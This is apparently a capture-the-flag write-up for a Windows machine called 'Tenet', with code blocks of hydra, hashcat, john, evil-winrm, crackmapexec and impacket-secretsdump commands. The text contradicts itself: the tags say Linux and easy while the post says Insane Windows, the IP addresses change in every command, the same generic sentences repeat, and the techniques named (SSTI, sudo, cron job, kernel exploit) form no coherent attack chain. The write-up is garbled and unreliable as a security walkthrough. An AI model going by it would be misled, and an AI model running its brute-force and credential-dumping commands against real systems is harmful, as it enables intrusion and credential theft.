---
TitleSEO: "PwnTillDawn — Tenet (Insane Windows) | ZureFX"
TitlePost: "PwnTillDawn — Tenet (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Tenet. ACL Abuse and Cron Job to achieve insane compromise on Windows."
Keywords: "easy, medium, linux"
URL: "https://zurefx.github.io/writeups/htb-tenet-211.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-211/"
Date: "2024-05-24"
Tags: "Easy, Medium, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-211"
Permalink: "/writeups/htb-tenet-211.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Tenet** is rated **Insane** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.41.100.213`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.101.242.146 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
nmap -sCV -p143,22,21 10.90.2.115 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.64.206.110 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.42.110.211 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
gobuster dir -u http://10.129.121.86/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p5985,3389,587 10.42.227.188 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **Cron Job**.

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.24.192.86 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.79.33.71
nmap -sCV -p5985,464,139 10.94.40.198 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
gobuster dir -u http://10.25.85.204/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.103.217.251 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.112.128.168/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.52.215.10 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.199.184/FUZZ
crackmapexec smb 10.48.2.218 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `nikto`
- `atexec`
- `burpsuite`
- `mimikatz`

### Key Takeaways

- ACL Abuse
- Cron Job
- Broken Access Control
